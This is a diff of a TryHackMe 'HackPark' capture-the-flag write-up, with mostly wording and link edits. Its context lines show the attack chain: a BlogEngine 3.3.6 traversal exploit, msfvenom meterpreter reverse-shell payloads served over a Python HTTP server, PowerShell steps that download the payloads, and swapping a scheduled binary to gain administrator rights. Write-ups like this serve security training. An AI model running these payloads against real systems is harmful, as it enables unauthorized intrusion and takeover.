@@ -111,15 +111,15 @@ Since the password is not strong enough, we have managed to crack it in a matter
 ## Searching for Vulnerabilities
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png)_Checking the version of the framework_<br>
 After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
-<br><br>After gathering the version information, we can check [Exploit-db](https://www.exploit-db.com/exploits/46353) to see
+<br><br>After gathering the version information, we can check [Exploit-db](https://www.exploit-db.com/exploits) to see
 if there is any vulnerability on that version. I will use the **searchsploit** utility, the CLI version
 of the Exploit-db.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png)<br>
 Multiple different exploits showed up. However, the first one is specifically for the version 3.3.6. We are going to
 use that. [Click to read more about _File Path, Directory Traversal_](https://portswigger.net/web-security/file-path-traversal).
 <br><br>
-## Hacking into the user's shell
-Download the exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
+## Hacking Into the User's Shell
+Download the [CVE-2019-6714](https://www.exploit-db.com/exploits/46353) exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png)_Editing 46353.cs file_<br>
 Rename the file as **PostView.ascx**.
 <br><br>Navigate to the Content tab, then click on the blog post to access the editor.
@@ -151,7 +151,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 sudo python -m http.server 80
 {% endhighlight %}
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png)_Creating meterpreter backdoor and starting a Python server_<br>
-<br><br>Download the backdoor to the target system with the following Powershell commands:
+<br>Download the backdoor to the target system with the following Powershell commands:
 {% highlight powershell %}
 cd "C:\Windows\Temp"
 mkdir myfolder
@@ -208,9 +208,9 @@ to walk around this.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png)<br>
 The scheduler executes a binary called Messages.exe every 23 seconds. 
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png)<br>
-This binary is also in the modifiable directory. If we create a 
+This binary in the modifiable directory too. If we create a 
 backdoor and put it where Message.exe sits, we can escalate our privileges.
-<br><br>Once again, let's create a meterpreter reverse shell binary.
+<br><br>Once again, let us create a meterpreter reverse shell binary.
 {% highlight powershell %}
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT} -f exe revshell.exe
 {% endhighlight %}
@@ -224,7 +224,7 @@ sudo python -m http.server 80
 <br><br>Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
 Then, replace the real binary with the malicious backdoor.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png)<br>
-<br><br>Sit back and wait for session to initialize.
+<br><br>Sit back and wait for the session to initialize.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png)<br>
 Voilà! We are the administrator now.
 ![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png)<br>
